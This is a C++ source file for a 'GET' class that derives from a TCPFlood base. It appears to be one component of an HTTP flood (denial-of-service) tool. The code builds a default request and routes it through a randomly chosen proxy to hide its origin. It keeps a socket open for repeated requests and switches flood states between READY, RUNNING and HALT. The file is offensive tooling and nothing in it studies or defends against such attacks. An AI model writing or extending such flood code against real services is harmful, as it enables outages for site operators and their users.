#include "../../include/methods/GET.h"


GET::GET(string address, uint16_t port)
	:TCPFlood(address, port)
	, requestRawPathQS("/") // TODO: find out parsing similar to Python's YARL
	, requestBody("")
{	
	this->setHeader(this->getDefaultHeader());
	
	this->createRequest(this->type, requestRawPathQS, requestBody);
	
	this->getTarget()->updateProxy(ProxyManager::getInstance()->getRandomProxy());
	
	this->initNetwork();
	// it is better to keep connection alive to avoid overhead
	// https://stackoverflow.com/questions/20599570/is-it-better-to-keep-a-socket-open-for-frequent-requests-or-to-close-the-socket
    this->getNetworkPtr()->Connect(); 
		
	this->setState(flood::State::READY);
}

void GET::start()
{
	this->setState(flood::State::RUNNING);
    //cout << this->getType() << " " << this->getState() << " " << this->getTarget()->getAddress() << endl;
}

void GET::stop()
{
	this->setState(flood::State::HALT);
    //cout << this->getType() << " " << this->getState() << " " << this->getTarget()->getAddress() << endl;
}

void GET::initNetwork()
{
	this->networkPtr = new SocketGLIBC(this->getTarget()->getAddress(), this->getTarget()->getPort());
}
